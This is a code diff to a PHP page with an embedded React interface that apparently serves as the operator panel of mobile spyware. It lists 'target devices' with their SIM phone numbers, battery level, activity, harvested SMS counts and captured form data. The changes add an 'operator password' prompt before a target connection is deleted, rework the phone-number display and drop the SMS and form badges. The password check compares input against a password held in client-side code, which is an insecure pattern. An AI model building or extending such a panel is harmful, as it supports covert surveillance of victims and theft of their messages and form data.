@@ -103,9 +103,14 @@ include_once __DIR__ . '/header.php';
 
       const handleDeleteDeviceConnection = (e, u) => {
         e.stopPropagation();
-        if (confirm(`Are you sure you want to delete connection for target device '${u.fullName}' (${u.userId})?`)) {
+        const passInput = prompt(`🔒 Security Verification Required:\nEnter operator password to delete connection for '${u.fullName}' (${u.userId}):`);
+        if (passInput === null) return;
+        
+        if (adminUser && passInput === adminUser.password) {
           setUsers(prev => prev.filter(item => item.id !== u.id));
           triggerToast(`🗑️ Connection for ${u.fullName} deleted successfully.`);
+        } else {
+          alert('❌ Incorrect Password! Target device connection was not deleted.');
         }
       };
 
@@ -719,7 +724,10 @@ include_once __DIR__ . '/header.php';
                   </div>
 
                   <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
-                    <div>📞 <strong>{u.sim1Data?.phone || u.mobileNumber}</strong> {u.sim2Data?.phone && u.sim2Data.phone !== 'Not inserted' ? <span style={{ color: '#cbd5e1' }}>• 📞 <strong>{u.sim2Data.phone}</strong></span> : ''}</div>
+                    <div>📞 <strong>{u.sim1Data?.phone || u.mobileNumber}</strong></div>
+                    {u.sim2Data?.phone && u.sim2Data.phone !== 'Not inserted' && (
+                      <div>📞 <strong>{u.sim2Data.phone}</strong></div>
+                    )}
                     {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
                     <div>🔋 Battery: {u.batteryLevel} • 🕒 Active: {u.lastActivityTime}</div>
                   </div>
@@ -738,15 +746,6 @@ include_once __DIR__ . '/header.php';
                     <button className="device-control-btn" onClick={(e) => handleDeleteDeviceConnection(e, u)} style={{ background: 'rgba(248,113,113,0.12)', color: '#f87171', border: '1px solid rgba(248,113,113,0.3)' }} title="Delete Connection">
                       🗑️ Delete
                     </button>
-                  </div>
-
-                  <div style={{ display: 'flex', gap: '8px', paddingTop: '0.65rem', borderTop: '1px solid rgba(255,255,255,0.08)', fontSize: '0.8rem' }}>
-                    <span className="pulse-badge" style={{ background: 'rgba(99,102,241,0.15)', color: '#818cf8' }}>
-                      💬 {u.totalSmsCount} SMS
-                    </span>
-                    <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>
-                      📝 {u.formDataList?.length || 0} Forms
-                    </span>
                   </div>
                 </div>
               ))}
